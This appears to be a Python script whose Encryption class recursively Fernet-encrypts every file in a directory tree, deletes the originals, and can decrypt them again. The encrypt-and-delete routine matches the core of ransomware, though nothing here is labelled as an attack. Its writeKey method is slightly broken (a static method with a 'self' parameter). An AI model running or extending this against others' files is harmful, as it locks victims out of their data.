#!/usr/bin/env python3

# Importing the necessary modules
import os
from cryptography.fernet import Fernet


class Encryption:
    def __init__(self, key):
        self.key = key

    # Generate a key
    @staticmethod
    def writeKey(self):
        # Generates a key and save it into a file
        key = Fernet.generate_key()

        # Saving the key to disk
        with open("key.key", "wb") as keyFile:
            keyFile.write(key)

    def encryptFilesInDirectory(self, directory):
        # Initialize the fernet class
        f = Fernet(self.key)

        # List all the files in the specified directory
        for fileName in os.listdir(directory):
           

            # Skip the key and program name that ends with .py or .enc
            if fileName == "output.jpg" or fileName == "main.py" or fileName.endswith(".enc") or fileName.endswith(".py"):
                continue

            # Create the complete file path
            filePath = os.path.join(directory, fileName)

            # Checking if the file is a regular file and not a directory
            if os.path.isfile(filePath):
                with open(filePath, "rb") as file:
                    fileData = file.read()

                # Encrypt the data
                encryptedData = f.encrypt(fileData)

                # Displaying the encrypted file name 
                print(f"[INFO] Encrypting: {fileName}")

                # Encoded file name
                encodedFileName = filePath + ".enc"

                # Write the encrypted data back to the file
                with open(encodedFileName, "wb") as file:
                    file.write(encryptedData)

                # Delete the original file
                os.remove(filePath)

            # If the entry is a directory, encrypt files within it
            elif os.path.isdir(filePath):
                self.encryptFilesInDirectory(filePath)

    def decryptFilesInDirectory(self, directory):
        # Initialize the fernet class
        f = Fernet(self.key)

        # List all the files in the specified direcfory
        for fileName in os.listdir(directory):

            # Skip the key and program name that ends with .py or .enc
            if fileName == "main.py" or fileName.endswith(".py"):
                continue

            # Create the complete file path
            filePath = os.path.join(directory, fileName)

            # Checking if the file is a regular file and not a directory
            if os.path.isfile(filePath) and fileName.endswith(".enc"):
                with open(filePath, "rb") as file:
                    encryptedData = file.read()

                # Decrypt the data
                decryptedData = f.decrypt(encryptedData)

                # Displaying the decryption message 
                print(f"[INFO] Decrypting: {fileName}")

                # Decoded file name by removing the .enc extension
                decodedFileName = filePath[:-4]

                # Write the decrypted data back to the file
                with open(decodedFileName, "wb") as file:
                    file.write(decryptedData)

                # Delete the encrypted file
                os.remove(filePath)

            # If the entry is a directory, decrypt files within it
            elif os.path.isdir(filePath):
                self.decryptFilesInDirectory(filePath)
